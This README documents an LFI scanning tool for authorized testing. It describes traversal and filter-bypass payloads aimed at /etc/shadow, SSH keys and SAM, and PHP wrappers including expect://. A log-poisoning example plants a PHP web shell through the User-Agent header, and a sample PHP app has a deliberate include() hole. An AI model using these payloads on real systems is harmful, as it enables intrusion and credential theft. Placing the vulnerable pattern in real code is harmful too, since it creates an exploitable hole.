# Punkt

A concurrent LFI (Local File Inclusion) and file-inclusion scanner written in Go,
modeled after the workflow of tools like `nmap` and `ffuf`: it fires one payload
per request in parallel, color-codes results by HTTP status, lets you filter what
reaches the terminal, and — unlike a plain status-code scanner — inspects the
response body to confirm whether the inclusion actually happened.

Read this in Portuguese: [`README.pt-BR.md`](./README.pt-BR.md)

**Authorized use only.** Run this exclusively against systems you own or have
explicit, written authorization to test: CTFs, your own lab VMs, scoped bug
bounty programs, or applications you built yourself. Scanning third-party
systems without permission is a criminal offense in most jurisdictions
(e.g. Law 12.737/2012 in Brazil, the CFAA in the United States) and a violation
of virtually every platform's terms of service. There is no flag or mode in
this tool that makes unauthorized scanning acceptable.

---

## Table of contents

- [How it works](#how-it-works)
- [Build](#build)
- [Quick start](#quick-start)
- [Injection points](#injection-points)
- [Payload wordlist in depth](#payload-wordlist-in-depth)
- [Confirmation logic: status match vs confirmed](#confirmation-logic-status-match-vs-confirmed)
- [Filtering output](#filtering-output)
- [Performance tuning](#performance-tuning)
- [Saving results](#saving-results)
- [Full flag reference](#full-flag-reference)
- [Recipes](#recipes)
- [Building a safe local target to practice on](#building-a-safe-local-target-to-practice-on)
- [Troubleshooting](#troubleshooting)
- [Limitations](#limitations)

---

## How it works

Punkt runs in five stages:

1. **Build the payload set** — either the embedded wordlist (generated on the
   fly from file lists x traversal depths x separators x encodings) or a
   custom wordlist you supply with `-w`.
2. **Spin up a worker pool** — `-t` goroutines pull payloads off a shared
   channel and fire HTTP requests concurrently.
3. **Inject the payload** — into the URL (`FUZZ` placeholder or `-p` query
   param), the request body (`-b`), a header (`-H`), or a cookie (`-c`).
4. **Classify the response** — by status code, and additionally by scanning
   the response body for concrete evidence of inclusion (not just "200 OK").
5. **Display and optionally persist** — results stream to the terminal
   filtered by `--mc`/`--fc`, and the full (unfiltered) result set can be
   saved to JSON or plain text.

No third-party dependencies: the entire tool is standard library Go, which is
why it cross-compiles for Windows, macOS, and Linux with nothing more than
`GOOS`/`GOARCH` and no CGO toolchain required.

## Build

```bash
go build -o punkt .
```

### Cross-compiling

```bash
# Windows, 64-bit — note Go appends .exe automatically even without -o punkt.exe
GOOS=windows GOARCH=amd64 go build -o punkt.exe .

# macOS, Intel
GOOS=darwin GOARCH=amd64 go build -o punkt_macos .

# macOS, Apple Silicon (M1/M2/M3/M4)
GOOS=darwin GOARCH=arm64 go build -o punkt_macos_arm .

# Linux, 64-bit
GOOS=linux GOARCH=amd64 go build -o punkt_linux .
```

On Windows, run the binary with the `.\` prefix in PowerShell
(`.\punkt.exe ...`) — PowerShell does not execute binaries from the current
directory by default, for security reasons. Use Windows Terminal or a modern
PowerShell host to see ANSI colors correctly; on a legacy `cmd.exe` that
renders raw escape codes instead of colors, add `--no-color`.

## Quick start

```bash
./punkt -u "http://target.local/index.php?page=FUZZ"
```

`FUZZ` marks the injection point. Punkt replaces it with every payload in the
active wordlist and reports back, one line per request, with status code,
response size, payload category, and — when applicable — a confirmed-inclusion
tag.

If the target URL has no natural place to put `FUZZ`, point at the parameter
name instead and Punkt appends/overwrites it:

```bash
./punkt -u "http://target.local/index.php" -p page
```

## Injection points

Punkt supports injecting the payload into any one of the following:

| Where | Flag | Example |
|---|---|---|
| URL (any position) | `FUZZ` literal in `-u` | `-u "http://x/view?file=FUZZ"` |
| GET query parameter | `-p` | `-p file` (used only if `-u` has no `FUZZ`) |
| Request body | `-b`, with `FUZZ` | `-b "template=FUZZ"` (pairs with `-X POST`) |
| HTTP header | `-H`, with `FUZZ` | `-H "X-Forwarded-For: FUZZ"` |
| Cookie | `-c`, with `FUZZ` | `-c "lang=FUZZ"` |

`-H` can be repeated to send several custom headers in the same request; only
the ones containing `FUZZ` actually get the payload substituted, the rest are
sent verbatim. This is useful for things like forged `X-Forwarded-For`,
`Referer`, or application-specific headers that end up in an `include()`/
`require()` call server-side.

## Payload wordlist in depth

The embedded wordlist is generated, not hardcoded as a flat list — this keeps
the binary small and makes it easy to reason about what each payload tests
for. It is built from four building blocks:

**1. Target files.** Curated per OS:

- *Linux*: `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/etc/issue`,
  `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/status`,
  `/proc/version`, Apache/Nginx/vsftpd/mail logs, bash history, SSH private
  keys.
- *Windows*: `win.ini`, `system.ini`, `boot.ini`, the hosts file, SAM,
  `unattend.xml`, XAMPP/WAMP access logs.

**2. Traversal depth and separator.** Each target file is prefixed with
`../` repeated at several depths (so the scanner still hits the file
regardless of how deeply nested the including script is), using whichever
separator set your `--level` selects: `/`, `\`, URL-encoded `%2f`, and
`%5c`.

**3. Encoding bypass variants** (levels 2 and 3 only): legacy null-byte
truncation (`%00`), double URL-encoding (`%252f`), and overlong UTF-8
encoding (`%c0%af`) — three classic techniques for slipping traversal
sequences past naive input filters that only decode once or only block the
literal `../` string.

**4. PHP wrapper payloads**, independent of OS or traversal depth:
`php://filter/convert.base64-encode/resource=...` (source disclosure without
code execution), `php://filter/read=string.rot13/resource=...`,
`php://input` (turns LFI into RFI-like behavior when `allow_url_include` is
off but `php://input` is reachable), `phar://`, `data://text/plain;base64,...`,
`expect://` (if the `expect` extension is loaded, this is direct command
execution, not just file disclosure), and `zip://`.

`--level` controls how exhaustive stages 2 and 3 are:

| Level | Depths | Separators | Encoding bypass variants | Use when |
|---|---|---|---|---|
| `1` | 2 | 1 | no | quick triage, noisy/rate-limited targets |
| `2` (default) | 5 | 2 | yes | general-purpose scanning |
| `3` | 10 | 4 | yes | thorough audit, WAF/filter-bypass testing |

Use `-w path/to/list.txt` to replace the embedded wordlist entirely with your
own (one payload per line, `#` for comments). This is the right move when you
already know the include logic (e.g. from source review) and want to hit very
specific paths, or when you're reusing a wordlist from a tool like
PayloadsAllTheThings.

## Confirmation logic: status match vs confirmed

A `200 OK` on its own is a weak signal — plenty of applications return `200`
for an error page, a redirect-via-JS page, or a generic fallback regardless of
what you passed in. Punkt distinguishes two things:

- **Status match** — the response status code is one you asked to see
  (`--mc`) or didn't ask to hide (`--fc`). This is purely a display filter.
- **Confirmed** — the response body contains concrete, category-specific
  evidence that the included file actually leaked:
  - Linux targets: a regex for `root:x:0:0:` (an actual `/etc/passwd` entry)
    or a `root:$<hash-id>$` shadow-style hash.
  - Windows targets: an INI section header like `[fonts]`, `[extensions]`,
    or `[boot loader]`.
  - PHP wrapper targets: the body is a base64 blob that decodes to something
    containing `<?php` or `<html` (meaning `php://filter` round-tripped real
    source code back to you).

A confirmed result is tagged `<-- LFI CONFIRMADO` in bold red. Treat a
status-match-only result as "worth looking at manually," and a confirmed
result as "you have evidence, go write it up." This distinction matters most
on `--level 3` runs, where you'll get far more status matches than genuine
confirmations — don't report the former as a finding without manually
verifying it.

## Filtering output

Borrowed directly from `ffuf`'s `-mc`/`-fc` convention:

```bash
# only show 200 and 403
./punkt -u "..." --mc 200,403

# hide 404 and 500, show everything else
./punkt -u "..." --fc 404,500
```

`--mc` and `--fc` only affect what prints to the terminal. The result set
written to disk (see [Saving results](#saving-results)) always contains
everything, filtered or not — so you can run with `--mc 200` for a clean
live view and still get the complete `404` list in the saved file for later
diffing. `-v` additionally surfaces network-level errors (timeouts, DNS
failures, connection resets) that are hidden by default.

## Performance tuning

- `-t` controls worker concurrency (default `20`). Raising it speeds up large
  scans but increases the chance of tripping rate limiting or WAF blocking —
  watch for a sudden wall of `403`s or `429`s as a sign you've gone too fast.
- `--delay` adds a pause (in milliseconds) before each request, per worker.
  Combine a lower `-t` with a non-zero `--delay` to stay under an aggressive
  rate limit while still running unattended.
- `--timeout` bounds how long Punkt waits per request (default `10`
  seconds). Lower it on fast local targets to fail quickly on dead payloads;
  raise it if the target is slow or you're tunneling through a proxy.
- `--level 1` is the fastest option when you just need a go/no-go signal
  before committing to a full `--level 3` run.

## Saving results

- `-o <file>` — save automatically when the scan finishes, no prompts asked.
- `--no-save` — never ask, never save.
- Neither flag set — Punkt asks before the scan starts whether to save (and
  takes the filename right there, so you don't have to remember to save
  after watching the scan run). If you decline at the start, it asks again
  at the end, in case you changed your mind watching the output.
- The extension decides the format: `.json` produces a structured array of
  objects, anything else produces one plain-text line per result.
- The saved file always contains the complete result set, regardless of
  `--mc`/`--fc` — those only filter the live terminal view.

Example JSON entry:

```json
{
  "payload": "../../../../etc/passwd",
  "category": "linux",
  "status_code": 200,
  "length": 2847,
  "confirmed": true,
  "url": "http://target.local/index.php?page=../../../../etc/passwd"
}
```

## Full flag reference

| Flag | Description | Default |
|---|---|---|
| `-u` | Target URL. Use `FUZZ` as the injection point | *(required)* |
| `-X` | HTTP method | `GET` |
| `-p` | GET parameter name, if `-u` has no `FUZZ` | *(none)* |
| `-b` | Request body, with `FUZZ` | *(none)* |
| `-c` | Cookie header value, can contain `FUZZ` | *(none)* |
| `-H` | Custom header `Name:Value`, repeatable | *(none)* |
| `-w` | Custom wordlist file, one payload per line | *(embedded wordlist)* |
| `-os` | Payload OS category: `linux`, `windows`, `all` | `all` |
| `--level` | Wordlist depth: `1`, `2`, `3` | `2` |
| `-t` | Concurrent workers | `20` |
| `--timeout` | Per-request timeout, seconds | `10` |
| `--delay` | Delay before each request, per worker, ms | `0` |
| `--mc` | Show only these status codes (comma-separated) | *(show all)* |
| `--fc` | Hide these status codes (comma-separated) | *(none)* |
| `-o` | Output file (`.json` or `.txt`), auto-saves | *(none)* |
| `--no-save` | Never ask to save, never save | `false` |
| `-k` | Skip TLS certificate verification | `false` |
| `--proxy` | Upstream proxy URL (e.g. Burp Suite) | *(none)* |
| `-v` | Also print network/request errors | `false` |
| `--no-color` | Disable ANSI colors | `false` |

## Recipes

```bash
# Baseline triage: fast, Linux-only, only look at promising codes
./punkt -u "http://target.local/view.php?file=FUZZ" --level 1 -os linux --mc 200,403

# Thorough pass with WAF-bypass encodings, hiding noise
./punkt -u "http://target.local/view.php?file=FUZZ" --level 3 --fc 404

# POST-based inclusion (e.g. a template name sent in the body)
./punkt -u "http://target.local/api/render" -X POST -b "template=FUZZ" --mc 200

# Header-based inclusion (log poisoning candidate: X-Forwarded-For ends up in a log file)
./punkt -u "http://target.local/" -H "X-Forwarded-For: FUZZ" --mc 200

# Through Burp Suite, ignoring the proxy's self-signed cert
./punkt -u "http://target.local/view.php?file=FUZZ" --proxy http://127.0.0.1:8080 -k

# Bring your own wordlist (e.g. exported from another tool, or hand-curated from source review)
./punkt -u "http://target.local/view.php?file=FUZZ" -w wordlists/custom_example.txt

# Unattended scan for a script/CI pipeline: no prompts, structured output
./punkt -u "http://target.local/view.php?file=FUZZ" -o scan-$(date +%Y%m%d).json --no-color -t 40
```

### A worked example: log poisoning chain

LFI by itself only reads files. Combined with a way to write attacker-controlled
content into a file the server will later read — like a web server access log —
it becomes remote code execution. The usual chain:

1. Send a request with a PHP payload in the `User-Agent` header, so it lands
   in the server's access log:
   ```bash
   curl -A '<?php system($_GET["c"]); ?>' "http://target.local/"
   ```
2. Use Punkt to confirm the access log is reachable through the LFI point:
   ```bash
   ./punkt -u "http://target.local/view.php?file=FUZZ" -os linux --mc 200 \
     -w <(echo "../../../../var/log/apache2/access.log")
   ```
3. If confirmed, requesting that path directly with `?c=id` appended executes
   the planted command. Punkt's job ends at step 2 — confirming the log is
   includable; the exploitation step is manual and out of scope for the
   scanner by design.

## Building a safe local target to practice on

Don't point this at production systems, including your own, until you've
tried it against something disposable. A five-line vulnerable PHP app is
enough:

```php
<?php
// intentionally vulnerable - local practice only
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "Usage: ?page=home.php";
}
```

Save that as `index.php` alongside a harmless `home.php`, then serve it with
PHP's built-in server:

```bash
php -S localhost:8000
```

And point Punkt at it:

```bash
./punkt -u "http://localhost:8000/index.php?page=FUZZ" -os linux --mc 200 --level 1
```

You should see `/etc/passwd` (and similar) come back confirmed. From there,
raise `--level` to see how the encoding-bypass payloads behave, and try
adding a basic filter to `index.php` (e.g. `str_replace('../', '', $page)`)
to see which Punkt payloads defeat it and which don't — this is the fastest
way to build intuition for how real-world LFI filters fail.

## Troubleshooting

- **`punkt : o termo não é reconhecido` in PowerShell** — PowerShell doesn't
  run binaries from the current directory without a prefix. Use
  `.\punkt.exe` (Windows) or `./punkt` (Linux/macOS), not a bare `punkt`.
- **Colors show as `\033[...]` garbage** — you're in a terminal that doesn't
  support ANSI escape codes (old `cmd.exe`). Add `--no-color`.
- **No injection point configured warning** — you passed a URL/body/header/
  cookie with no `FUZZ` in it and no `-p`. Add one; otherwise the scan sends
  the same identical request for every payload.
- **Only ever getting `404` / `000`** — double-check that the target URL is
  reachable at all with `curl`, that `FUZZ` is actually present in the
  string you passed to `-u`/`-b`/`-H`/`-c`, and that you're not behind a
  typo'd `--proxy`.
- **Everything is `confirmed: false` even though you can see a 200** —
  confirmation is content-based, not status-based by design. A `200` with a
  generic error page body is not evidence of inclusion; check the raw
  response yourself (or re-run through `--proxy` into Burp) before assuming
  the detector is wrong.

## Limitations

This is a learning/triage tool, not a full exploitation framework. By design
it does not: brute-force multiple targets from a list, automatically chain a
confirmed LFI into RCE, diff response length against a baseline to catch
blind inclusion, or follow redirects (disabled on purpose, since a redirect's
status code is itself diagnostic). These are reasonable next features if you
want to extend it — the codebase has no external dependencies, so adding to
`payloads.go` or `detect.go` is the lowest-friction path in.